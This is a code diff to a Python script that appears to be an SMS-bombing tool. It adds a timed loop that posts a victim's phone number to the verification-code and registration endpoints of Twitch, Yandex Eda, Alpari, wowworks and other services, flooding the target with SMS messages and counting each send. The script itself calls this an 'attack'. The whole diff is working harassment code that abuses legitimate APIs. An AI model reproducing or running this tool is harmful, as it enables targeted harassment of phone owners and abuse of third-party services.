@@ -249,6 +249,7 @@ if call == str(2):
     print(Fore.GREEN)
 
     while True:
+       
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -261,6 +262,82 @@ if call == str(2):
             time.sleep(1)
         except:
             print('[-] Error in sent!')
+        if time.time() > start_time + float(CLOSE_AFTER):
+            print(Fore.RED)
+            print("The attack is over! Press ENTER to close...")
+            break
+        try:
+            requests.post('https://passport.twitch.tv/register?trusted_request=true',
+                          json={"birthday": {"day": 11, "month": 11, "year": 1999},
+                                "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
+                                "password": password, "phone_number": _phone, "username": username})
+            R = R + 1
+            print('[+] Twitch Was sent! || Count - ' + str(R))
+            time.sleep(1)
+        except:
+            print('[-] Error in sent!')
+        if time.time() > start_time + float(CLOSE_AFTER):
+            print(Fore.RED)
+            print("The attack is over! Press ENTER to close...")
+            break
+        try:
+            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
+                          headers={'App-ID': 'cabinet'})
+            R = R + 1
+            print('[+] CabWiFi Was sent! || Count - ' + str(R))
+            time.sleep(1)
+        except:
+            print('[-] Error in sent!')
+        if time.time() > start_time + float(CLOSE_AFTER):
+            print(Fore.RED)
+            print("The attack is over! Press ENTER to close...")
+            break
+        try:
+            requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
+            R = R + 1
+            print('[+] wowworks Was sent! || Count - ' + str(R))
+            time.sleep(1)
+        except:
+            print('[-] Error in sent!')
+        if time.time() > start_time + float(CLOSE_AFTER):
+            print(Fore.RED)
+            print("The attack is over! Press ENTER to close...")
+            break
+        try:
+            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
+                          json={"phone_number": "+" + _phone})
+            R = R + 1
+            print('[+] Eda.Yandex Was sent! || Count - ' + str(R))
+            time.sleep(1)
+        except:
+            print('[-] Error in sent!')
+
+        if time.time() > start_time + float(CLOSE_AFTER):
+            print(Fore.RED)
+            print("The attack is over! Press ENTER to close...")
+            break
+        try:
+            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
+                          json={"client_type": "personal", "email": f"{email}@gmail.ru", "mobile_phone": _phone,
+                                "deliveryOption": "sms"})
+            R = R + 1
+            print('[+] Alpari Was sent! || Count - ' + str(R))
+            time.sleep(1)
+        except:
+            print('[-] Error in sent!')
+        if time.time() > start_time + float(CLOSE_AFTER):
+            print(Fore.RED)
+            print("The attack is over! Press ENTER to close...")
+            break
+        try:
+            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
+            R = R + 1
+            print('[+] SMS Was sent! || Count - ' + str(R))
+            time.sleep(1)
+        except:
+            print('[-] Error in sent!')
+
+
     input()
 
 _name = ''
